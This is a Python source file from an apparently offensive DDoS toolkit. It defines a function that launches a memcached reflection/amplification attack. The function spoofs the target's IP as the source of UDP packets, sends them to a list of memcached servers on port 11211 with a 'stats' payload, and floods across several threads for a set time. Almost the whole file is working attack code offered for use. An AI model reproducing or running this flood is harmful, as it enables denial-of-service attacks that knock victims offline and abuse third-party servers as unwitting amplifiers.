#!/usr/bin/env python3

# MIT License
#
# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import random
import time
from scapy.all import IP, UDP, send, Raw
from threading import Thread

def MEMCACHED_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting MEMCACHED attack...")
	
	# Payload
	payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
	threads_list = []
	# Load MEMCACHED servers list
	with open("tools/L4/memcached_servers.txt", 'r') as f:
		memcached_servers = f.readlines()

	# MEMCACHED flood
	def memcached_flood():
		global FINISH
		while not FINISH:
			for server in memcached_servers:
				if not FINISH:
					packets = random.randint(10, 150)
					server = server.replace("\n", "")
					# Packet
					try:
						packet = IP(dst = server, src = target_ip) / UDP(sport = target_port, dport = 11211) / Raw(load = payload)
						send(packet, count = packets, verbose = False)
					except Exception as e:
						print(e)
					else:
						print("\033[1;34m"+"[*]"+"\033[0m"+" Sending " + str(packets) + " forged UDP packets to " + server + "...")

	# Start threads
	for thread in range(threads):
		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
		t = Thread(target = memcached_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("\033[1;33m"+"[!]"+"\033[0m"+" MEMCACHED attack stopped.")
